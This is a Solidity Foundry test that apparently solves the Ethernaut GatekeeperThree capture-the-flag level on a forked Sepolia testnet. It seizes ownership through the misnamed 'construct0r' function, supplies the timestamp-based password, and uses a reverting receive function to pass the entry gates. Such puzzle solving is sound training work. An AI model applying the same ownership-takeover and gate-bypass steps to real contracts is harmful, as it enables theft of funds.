// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {GatekeeperThree} from "../src/GatekeeperThree.sol";

contract GatekeeperThreeTest is Test {

    function setUp() public {
        vm.createSelectFork("https://ethereum-sepolia-rpc.publicnode.com", 6708262);
    }

    function test_Enter() public {
        GatekeeperThree gatekeeperThree = GatekeeperThree(payable(0x81d01dB5A1e09759c8b6AE892c0796b38DafA681));
        
        // vm.prank(0xA6270E61a6485f649f7E18b6e9eBF4d1d184D69d);
        // payable(address(gatekeeperThree)).transfer(0.0011 ether);

        // vm.startPrank(address(this), 0xA6270E61a6485f649f7E18b6e9eBF4d1d184D69d);

        gatekeeperThree.construct0r();

        console.log("owner : ", gatekeeperThree.owner());

        gatekeeperThree.createTrick();

        console.log("trick : ", address(gatekeeperThree.trick()));

        gatekeeperThree.getAllowance(block.timestamp);

        console.log("allowEntrance : ", gatekeeperThree.allowEntrance());

        gatekeeperThree.enter();

        console.log("entrant : ", gatekeeperThree.entrant());
    }

    receive() external payable {
        revert();
    }
}
